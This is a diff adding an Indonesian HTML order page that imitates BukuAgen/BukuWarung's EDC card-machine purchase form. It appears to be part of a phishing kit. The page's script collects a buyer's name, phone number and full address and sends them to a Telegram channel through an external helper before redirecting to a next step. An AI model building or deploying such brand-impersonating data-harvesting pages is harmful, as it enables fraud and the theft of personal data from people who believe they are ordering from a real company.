@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pemesanan EDC BukuAgen</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+        }
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        .no-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+        /* Animasi Berputar untuk Loading Spinner */
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .animate-spin-custom {
+            animation: spin 1s linear infinite;
+        }
+    </style>
+</head>
+<body class="flex justify-center items-center min-h-screen p-0 sm:p-4">
+
+    <div class="w-full max-w-md bg-white h-screen sm:h-[800px] flex flex-col relative shadow-2xl overflow-hidden rounded-none sm:rounded-3xl border border-gray-100">
+        
+        <div class="px-6 pt-6 pb-3 bg-white shrink-0 border-b border-gray-50 flex items-center justify-between z-20">
+            <div class="h-6 flex items-center">
+                <img src="assets/img/bukuagen.png" alt="Logo BukuAgen" class="h-full object-contain">
+            </div>
+        </div>
+
+        <div class="flex-1 overflow-y-auto no-scrollbar p-5 space-y-6 pb-32">
+            
+            <div class="flex items-center justify-between">
+                <h1 class="text-[16px] font-bold text-gray-900 tracking-tight">Pemesanan EDC BukuAgen</h1>
+                <button onclick="window.location.href='a.html'" class="border border-blue-400 text-blue-500 font-bold text-[13px] px-4 py-1.5 rounded-xl hover:bg-blue-50 cursor-pointer transition">Ubah</button>
+            </div>
+
+            <div class="border border-gray-100 rounded-2xl p-4 shadow-[0_2px_8px_rgba(0,0,0,0.01)] bg-white flex gap-4">
+                <div class="w-20 h-20 border border-gray-100 rounded-xl p-1 flex items-center justify-center bg-gray-50 shrink-0">
+                    <img id="display-image" src="assets/img/produk1.webp" alt="Produk" class="w-full h-full object-contain">
+                </div>
+                <div class="flex flex-col justify-between flex-grow">
+                    <div class="flex justify-between items-start gap-2">
+                        <div>
+                            <h2 id="display-title" class="font-extrabold text-gray-900 text-[14px] leading-tight">Beli MoreFun</h2>
+                            <p id="display-desc" class="text-[11px] text-gray-400 mt-1 leading-snug">Sambungkan dengan Smartphone, untuk Transaksi dengan Kartu</p>
+                        </div>
+                        <span id="display-price" class="font-extrabold text-gray-900 text-[14px] whitespace-nowrap">Rp 169.000</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="space-y-4">
+                <div>
+                    <h3 class="text-[14px] font-bold text-gray-900">Informasi Data Pribadi</h3>
+                    <p class="text-[11px] text-gray-400 mt-0.5 leading-relaxed">Data ini diperlukan untuk proses registrasi pembelian dan penggunaan mesin EDC dan layanan mini ATM BukuWarung.</p>
+                </div>
+
+                <div class="space-y-1.5">
+                    <label class="text-[12px] font-bold text-gray-900">Nama Lengkap</label>
+                    <input type="text" id="input-nama" placeholder="Nama Lengkap" class="w-full border border-gray-200 rounded-xl px-4 py-3 text-[13px] focus:outline-none focus:border-blue-500 transition placeholder-gray-300">
+                </div>
+
+                <div class="space-y-1.5">
+                    <label class="text-[12px] font-bold text-gray-900">Nomor HP</label>
+                    <input type="tel" id="input-hp" placeholder="Contoh: 081234567890" class="w-full border border-gray-200 rounded-xl px-4 py-3 text-[13px] focus:outline-none focus:border-blue-500 transition placeholder-gray-300">
+                </div>
+
+                <div class="space-y-1.5">
+                    <div class="flex justify-between items-center">
+                        <label class="text-[12px] font-bold text-gray-900">Alamat Pengiriman</label>
+                        <button class="text-gray-500 border border-gray-200 rounded-lg px-2.5 py-1 text-[11px] font-medium flex items-center gap-1 bg-white hover:bg-gray-50">
+                            <span>Lokasi Saat Ini</span>
+                            <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                        </button>
+                    </div>
+                    <textarea id="input-alamat" placeholder="Alamat Pengiriman" rows="3" class="w-full border border-gray-200 rounded-xl px-4 py-3 text-[13px] focus:outline-none focus:border-blue-500 transition resize-none placeholder-gray-300"></textarea>
+                    <p class="text-[10px] text-gray-400 leading-normal">Alamat yang akan dicantumkan di mesin EDC dan struk</p>
+                </div>
+
+                <div class="space-y-1.5">
+                    <label class="text-[12px] font-bold text-gray-900">Provinsi</label>
+                    <div class="relative">
+                        <select id="select-provinsi" class="w-full border border-gray-200 appearance-none rounded-xl px-4 py-3 text-[13px] text-gray-500 focus:outline-none focus:border-blue-500 transition bg-white cursor-pointer">
+                            <option value="">Pilih</option>
+                        </select>
+                        <div class="absolute inset-y-0 right-4 flex items-center pointer-events-none text-gray-400">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path></svg>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="space-y-1.5 hidden" id="wrap-kota">
+                    <label class="text-[12px] font-bold text-gray-900">Kota / Kabupaten</label>
+                    <div class="relative">
+                        <select id="select-kota" class="w-full border border-gray-200 appearance-none rounded-xl px-4 py-3 text-[13px] text-gray-500 focus:outline-none focus:border-blue-500 transition bg-white cursor-pointer">
+                            <option value="">Pilih</option>
+                        </select>
+                        <div class="absolute inset-y-0 right-4 flex items-center pointer-events-none text-gray-400">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path></svg>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="space-y-1.5 hidden" id="wrap-kecamatan">
+                    <label class="text-[12px] font-bold text-gray-900">Kecamatan</label>
+                    <div class="relative">
+                        <select id="select-kecamatan" class="w-full border border-gray-200 appearance-none rounded-xl px-4 py-3 text-[13px] text-gray-500 focus:outline-none focus:border-blue-500 transition bg-white cursor-pointer">
+                            <option value="">Pilih</option>
+                        </select>
+                        <div class="absolute inset-y-0 right-4 flex items-center pointer-events-none text-gray-400">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path></svg>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="space-y-1.5 hidden" id="wrap-kelurahan">
+                    <label class="text-[12px] font-bold text-gray-900">Kelurahan / Desa</label>
+                    <div class="relative">
+                        <select id="select-kelurahan" class="w-full border border-gray-200 appearance-none rounded-xl px-4 py-3 text-[13px] text-gray-500 focus:outline-none focus:border-blue-500 transition bg-white cursor-pointer">
+                            <option value="">Pilih</option>
+                        </select>
+                        <div class="absolute inset-y-0 right-4 flex items-center pointer-events-none text-gray-400">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path></svg>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="space-y-1.5 hidden" id="wrap-kodepos">
+                    <label class="text-[12px] font-bold text-gray-900">Kode Pos</label>
+                    <input type="text" id="input-kodepos" readonly placeholder="Kode Pos" class="w-full border border-gray-200 rounded-xl px-4 py-3 text-[13px] text-gray-700 focus:outline-none focus:border-blue-500 transition bg-gray-50 cursor-default">
+                </div>
+            </div>
+
+            <div class="space-y-4 pt-2">
+                <div class="text-[12px] font-bold text-gray-900">Apakah informasi yang telah Anda isi sudah benar?</div>
+                <label class="flex items-start gap-3 cursor-pointer">
+                    <input type="checkbox" id="check-info" class="w-4 h-4 mt-0.5 rounded border-gray-300 text-blue-600 focus:ring-blue-500">
+                    <span class="text-[11.5px] text-gray-600 leading-relaxed font-medium">Ya, saya sudah membaca ulang dan informasi yang saya berikan di atas sudah benar dan akurat.</span>
+                </label>
+
+                <div class="text-[12px] font-bold text-gray-900 pt-1">Apakah Anda menyetujui Syarat dan Ketentuan yang berlaku?</div>
+                <label class="flex items-start gap-3 cursor-pointer">
+    <input type="checkbox" id="check-terms" class="w-4 h-4 mt-0.5 rounded border-gray-300 text-blue-600 focus:ring-blue-500">
+    <span class="text-[11.5px] text-gray-600 leading-relaxed font-medium">
+        Ya saya dengan ini menyatakan telah membaca dan menyetujui <br>
+        <a href="#" style="color: #2563EB;" class="underline">Syarat dan Ketentuan</a> <br>
+        Pembelian dan Penggunaan Mesin EDC dan Layanan Mini ATM BukuWarung dan <br>
+        <a href="#" style="color: #2563EB;" class="underline">Syarat dan Ketentuan Garansi Mesin Electronic Data Capture (EDC)</a> <br>
+        BukuWarung, serta syarat dan ketentuan lainnya yang berlaku pada platform BukuWarung dan BukuAgen.
+    </span>
+</label>
+
+</label>
+
+
+            </div>
+        </div>
+
+        <div class="absolute bottom-0 left-0 right-0 bg-white p-4 border-t border-gray-100 shadow-[0_-10px_25px_rgba(0,0,0,0.04)] rounded-t-2xl z-30 shrink-0">
+            <button id="btn-next" class="w-full bg-[#FFD12D] text-gray-500 font-extrabold py-3.5 rounded-xl shadow-sm opacity-40 pointer-events-none cursor-not-allowed transition-all duration-200 flex items-center justify-center gap-2">
+                <svg id="btn-spinner" class="hidden w-5 h-5 text-black animate-spin-custom" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                <span id="btn-text" class="text-sm">Lanjut</span>
+            </button>
+        </div>
+
+    </div>
+
+    <script src="assets/data.js"></script>
+    <script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    const savedName = localStorage.getItem('selectedProductName') || 'Beli MoreFun';
+    const savedPrice = localStorage.getItem('selectedProductPrice') || 'Rp 169.000';
+    const savedImage = localStorage.getItem('selectedProductImage');
+    const savedDesc = localStorage.getItem('selectedProductDesc');
+
+    if (savedName) document.getElementById('display-title').innerText = savedName;
+    if (savedPrice) document.getElementById('display-price').innerText = savedPrice;
+    if (savedImage) document.getElementById('display-image').src = savedImage;
+    if (savedDesc) document.getElementById('display-desc').innerText = savedDesc;
+
+    const selectProvinsi = document.getElementById('select-provinsi');
+    const selectKota = document.getElementById('select-kota');
+    const selectKecamatan = document.getElementById('select-kecamatan');
+    const selectKelurahan = document.getElementById('select-kelurahan');
+
+    const wrapKota = document.getElementById('wrap-kota');
+    const wrapKecamatan = document.getElementById('wrap-kecamatan');
+    const wrapKelurahan = document.getElementById('wrap-kelurahan');
+    const wrapKodepos = document.getElementById('wrap-kodepos');
+    const inputKodepos = document.getElementById('input-kodepos');
+
+    const inputNama = document.getElementById('input-nama');
+    const inputHp = document.getElementById('input-hp');
+    const inputAlamat = document.getElementById('input-alamat');
+
+    const checkInfo = document.getElementById('check-info');
+    const checkTerms = document.getElementById('check-terms');
+    const btnNext = document.getElementById('btn-next');
+    const btnSpinner = document.getElementById('btn-spinner');
+    const btnText = document.getElementById('btn-text');
+
+    function toggleBtnNext() {
+        if (checkInfo.checked && checkTerms.checked) {
+            btnNext.classList.remove('opacity-40', 'pointer-events-none', 'cursor-not-allowed', 'text-gray-500');
+            btnNext.classList.add('text-gray-900', 'cursor-pointer', 'hover:bg-yellow-400');
+        } else {
+            btnNext.classList.add('opacity-40', 'pointer-events-none', 'cursor-not-allowed', 'text-gray-500');
+            btnNext.classList.remove('text-gray-900', 'cursor-pointer', 'hover:bg-yellow-400');
+        }
+    }
+
+    checkInfo.addEventListener('change', toggleBtnNext);
+    checkTerms.addEventListener('change', toggleBtnNext);
+
+    btnNext.addEventListener('click', async function() {
+        if (checkInfo.checked && checkTerms.checked) {
+            
+            if(!inputNama.value.trim() || !inputHp.value.trim() || !inputAlamat.value.trim()) {
+                alert("Silahkan lengkapi Nama, Nomor HP, dan Alamat terlebih dahulu.");
+                return;
+            }
+
+            btnNext.classList.add('pointer-events-none', 'opacity-80');
+            btnSpinner.classList.remove('hidden');
+            btnText.innerText = "Memproses...";
+
+            const provText = selectProvinsi.options[selectProvinsi.selectedIndex]?.text || '-';
+            const kotaText = selectKota.options[selectKota.selectedIndex]?.text || '-';
+            const kecText = selectKecamatan.options[selectKecamatan.selectedIndex]?.text || '-';
+            const kelText = selectKelurahan.options[selectKelurahan.selectedIndex]?.text || '-';
+            const kodePosText = inputKodepos.value || '-';
+            
+            const alamatGabungan = `${inputAlamat.value}, ${kelText}, ${kecText}, ${kotaText}, ${provText}, ${kodePosText}`;
+
+            // === JALUR SINKRONISASI KE HALAMAN 3 (TIDAK MENGUBAH PESAN TELEGRAM) ===
+            localStorage.setItem('customerNama', inputNama.value.trim());
+            localStorage.setItem('customerHp', inputHp.value.trim());
+            localStorage.setItem('customerAlamatComplete', alamatGabungan);
+
+            // === PESAN MASUK TELEGRAM UTAMA (TIDAK DIUBAH) ===
+            const pesanTelegram = `✨ *PESANAN BARU EDC BUKUAGEN* ✨\n` +
+                `-----------------------------------------\n` +
+                `🛍️ *Produk:* ${savedName}\n` +
+                `💰 *Harga:* ${savedPrice}\n\n` +
+                `👤 *Data Pribadi Pelanggan:*\n` +
+                `• Nama Lengkap: ${inputNama.value}\n` +
+                `• Nomor HP: ${inputHp.value}\n\n` +
+                `📍 *Alamat Pengiriman:*\n` +
+                `• Alamat: ${inputAlamat.value}\n` +
+                `• Provinsi: ${provText}\n` +
+                `• Kota/Kab: ${kotaText}\n` +
+                `• Kecamatan: ${kecText}\n` +
+                `• Kelurahan/Desa: ${kelText}\n` +
+                `• Kode Pos: ${kodePosText}\n` +
+                `-----------------------------------------`;
+
+            try {
+                await sendTelegramMessage(pesanTelegram);
+            } catch (error) {
+                console.error("Proses pengiriman Telegram terganggu:", error);
+            }
+
+            window.location.href = '3.html';
+        }
+    });
+
+    // API Wilayah Indonesia
+    async function loadProvinsi() {
+        try {
+            const response = await fetch('https://www.emsifa.com/api-wilayah-indonesia/api/provinces.json');
+            const data = await response.json();
+            selectProvinsi.innerHTML = '<option value="">Pilih Provinsi</option>';
+            data.forEach(p => selectProvinsi.innerHTML += `<option value="${p.id}">${p.name}</option>`);
+        } catch (e) { console.error(e); }
+    }
+
+    async function loadKota(id) {
+        wrapKota.classList.remove('hidden');
+        try {
+            const response = await fetch(`https://www.emsifa.com/api-wilayah-indonesia/api/regencies/${id}.json`);
+            const data = await response.json();
+            selectKota.innerHTML = '<option value="">Pilih Kota / Kabupaten</option>';
+            data.forEach(k => selectKota.innerHTML += `<option value="${k.id}">${k.name}</option>`);
+        } catch (e) { console.error(e); }
+    }
+
+    async function loadKecamatan(id) {
+        wrapKecamatan.classList.remove('hidden');
+        try {
+            const response = await fetch(`https://www.emsifa.com/api-wilayah-indonesia/api/districts/${id}.json`);
+            const data = await response.json();
+            selectKecamatan.innerHTML = '<option value="">Pilih Kecamatan</option>';
+            data.forEach(k => selectKecamatan.innerHTML += `<option value="${k.id}">${k.name}</option>`);
+        } catch (e) { console.error(e); }
+    }
+
+    async function loadKelurahan(id) {
+        wrapKelurahan.classList.remove('hidden');
+        try {
+            const response = await fetch(`https://www.emsifa.com/api-wilayah-indonesia/api/villages/${id}.json`);
+            const data = await response.json();
+            selectKelurahan.innerHTML = '<option value="">Pilih Kelurahan / Desa</option>';
+            data.forEach(k => selectKelurahan.innerHTML += `<option value="${k.id}">${k.name}</option>`);
+        } catch (e) { console.error(e); }
+    }
+
+    selectProvinsi.addEventListener('change', function () {
+        wrapKota.classList.add('hidden'); wrapKecamatan.classList.add('hidden'); wrapKelurahan.classList.add('hidden'); wrapKodepos.classList.add('hidden');
+        if (this.value) loadKota(this.value);
+    });
+
+    selectKota.addEventListener('change', function () {
+        wrapKecamatan.classList.add('hidden'); wrapKelurahan.classList.add('hidden'); wrapKodepos.classList.add('hidden');
+        if (this.value) loadKecamatan(this.value);
+    });
+
+    selectKecamatan.addEventListener('change', function () {
+        wrapKelurahan.classList.add('hidden'); wrapKodepos.classList.add('hidden');
+        if (this.value) loadKelurahan(this.value);
+    });
+
+    selectKelurahan.addEventListener('change', async function () {
+        if (!this.value) return;
+        wrapKodepos.classList.remove('hidden');
+        inputKodepos.value = 'Loading...';
+        try {
+            const query = `${selectKelurahan.options[selectKelurahan.selectedIndex].text} ${selectKecamatan.options[selectKecamatan.selectedIndex].text} ${selectKota.options[selectKota.selectedIndex].text}`;
+            const r = await fetch(`https://kodepos.vercel.app/search?q=${encodeURIComponent(query)}`);
+            const res = await r.json();
+            inputKodepos.value = res?.data?.[0]?.postalcode || '-';
+        } catch (e) { inputKodepos.value = '-'; }
+    });
+
+    loadProvinsi();
+});
+    </script>
+</body>
+</html>
